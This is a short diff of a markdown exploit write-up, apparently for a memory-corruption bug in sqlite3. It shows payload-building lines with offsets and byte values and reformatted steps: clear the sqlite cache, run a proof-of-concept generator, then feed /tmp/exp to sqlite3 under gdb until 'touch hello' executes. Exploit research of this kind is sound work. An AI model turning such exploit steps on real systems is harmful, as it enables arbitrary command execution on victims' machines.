@@ -290,16 +290,23 @@ exp_2 = writeVal(exp_2, src_off, src_base_2 + 0x8, 8)
 exp_2 = writeVal(exp_2, src_off + 0x8, 0x6f6c6c6568206863756f743b, 13)
 ```
 
-```
-// exploit
-// We need to figure out the correct base address and shellstate address
+```bash
+# clean up sqlite cache
 rm -rf ~/.sqlite*
-./doXdgOpen-exp.py
-gdb ./sqlite3
-    b output_reset
-    r < /tmp/exp
 
-command "touch hello" is executed and we can find file "hello" in current folder.
+# We need to figure out the correct base address and shellstate address
+
+# generate the exploit poc
+./poc.py
+
+# exploit within gdb
+
+$ gdb ./sqlite3
+(gdb) b output_reset
+(gdb) r < /tmp/exp
+
+# command `touch hello` will be executed and
+# we can find file "hello" in current folder.
 ```
 
 ## Tips
